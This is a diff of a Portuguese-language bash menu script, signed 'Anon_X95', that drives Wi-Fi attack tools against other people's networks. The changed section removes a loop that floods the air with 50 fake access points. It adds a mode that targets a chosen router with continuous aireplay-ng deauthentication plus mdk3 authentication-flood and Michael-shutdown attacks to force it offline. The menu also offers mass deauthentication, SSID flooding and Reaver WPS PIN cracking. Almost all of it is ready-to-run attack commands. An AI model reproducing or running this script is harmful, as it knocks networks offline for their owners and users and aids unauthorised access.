@@ -25,19 +25,21 @@ echo "** 1. Ataca uma Rede                                  ***"
 echo "** 2. Ataca duas Redes                                ***"
 echo "** 3. Ataca Uma Rede (Macchanger)                     ***"
 echo "** 4. Ataca Com Mdk3,Aireplay-ng,Macchanger           ***"
-echo "** 5. Criar 50 Redes Com Airbase-ng (Inundação SSID)  ***"
-echo "** 6. Mdk3 (Inundação SSID)                           ***"
+echo "** 5. Forca o Reinicio do Roteador       	            ***"
+echo "** 6. Mdk3 (Inundação SSID) Nomes Aleatorios          ***"
 echo "** 7. Desautenticação em Massa Derruba Ate a Sua Rede ***"
 echo "** 8. Ataca 6 Redes (Aireplay-ng)                     ***"
 echo "** 9. Descobre ou Tenta a Senha Metodo WPS (Reaver)   ***"
 echo "** 10. Reinicia Sua Placa(Normal)                     ***"
-echo "** 11. TESTE                                          ***"
+echo "** 11. Cria Redes Wifi com o nome que Escolher        ***"
+echo "**                                                    ***"
 echo "*********************************************************"
 echo "**********            Anon_X95            ***************"
 echo "*********************************************************"
 echo ""
 
 read n
+echo ""
 case $n in
 1)clear
 airodump-ng $WIRELLES --wps
@@ -205,129 +207,30 @@ sleep 2
 sleep 2
 echo "Bom Isso e Tudo Pessoal !!!" ;;
 5)clear
-echo "O Bom e Quer Voce Pode Fazer o Evil Twin  "
-echo "Vamos lá"
+
+echo "Esse modo pode sobrecarregar a sua placa, entao talvez pode ter que reiniciar o script:"
+echo ""
+read -p "Aperte para continuar"
+sleep 1
 clear
-echo "Selecione o Nome da Rede a Ser Repetida SSID:"
-read NOME
-[[ $NOME == "" ]]
-echo "Selecione o CANAL Da Rede Fake:"
-read CANAL
-[[ $CANAL == "" ]]
-echo "Selecione o Tempo de Repetição em Segundos:"
-read TEMPO
-[[ $TEMPO == "" ]]
-clear
-read -p "Aperte para prosseguir "
-while :; do echo
-(xterm -e airbase-ng --essid "$NOME" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 2" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 3" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 4" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 5" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 6" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 7" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 8" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 9" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 10" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 11" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 12" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 13" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 14" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 15" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 16" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 17" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 18" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 19" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 20" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 21" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 22" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 23" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 24" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 25" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 26" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 27" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 28" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 29" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 30" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 31" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 32" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 33" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 34" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 35" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 36" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 37" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 38" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 39" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 40" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 41" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 42" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 43" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 44" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 45" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 46" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 47" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 48" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 49" -c $CANAL $WIRELLES) &
-sleep 1
-(xterm -e airbase-ng --essid "$NOME 50" -c $CANAL $WIRELLES) &
-sleep $TEMPO
-killall airbase-ng
-sleep 30
-ifconfig $REDE down
-iwconfig $REDE mode monitor
-macchanger -r $REDE
-clear
+airodump-ng $WIRELLES --wps
+echo ""
+echo "Informe o BSSID da Rede Alvo:"
+read UBSSID
+echo "Informe o CANAL da Rede Alvo:"
+read UCANAL
+echo ""
 sleep 3
-done
+(xterm -title "Monitoramento da Rede" -e airodump-ng $WIRELLES --bssid $UBSSID --channel $UCANAL --wps) &
+sleep 3
+(xterm -title "Aireplay-ng" -e aireplay-ng -0 0 -a $UBSSID $WIRELLES) &
+sleep 1
+(xterm -title "Mdk3" -e mdk3 $WIRELLES a -a $UBSSID -s 10000) &
+sleep 1
+(xterm -title "Mdk3 2" -e mdk3 $WIRELLES m -t $UBSSID -j -w 60 -s 10000) &
+sleep 1
+echo ""
+echo "Pronto, agora e so esperar"
 ;;
 
 11)clear
